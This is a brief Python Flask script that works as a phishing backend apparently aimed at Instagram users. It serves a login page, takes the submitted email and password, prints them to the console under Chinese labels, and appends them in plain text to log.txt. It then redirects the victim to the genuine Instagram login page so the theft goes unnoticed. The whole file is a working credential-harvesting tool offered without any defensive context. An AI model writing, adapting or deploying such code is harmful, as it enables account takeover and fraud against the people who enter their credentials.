from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html') 

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('pass')

    print(f"[*] 帳號: {username}")
    print(f"[*] 密碼: {password}")

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(f"Account: {username} | Password: {password}\n")

    return redirect("https://www.instagram.com/accounts/login/")
    
if __name__ == '__main__':
    app.run(debug=True, port=5000)
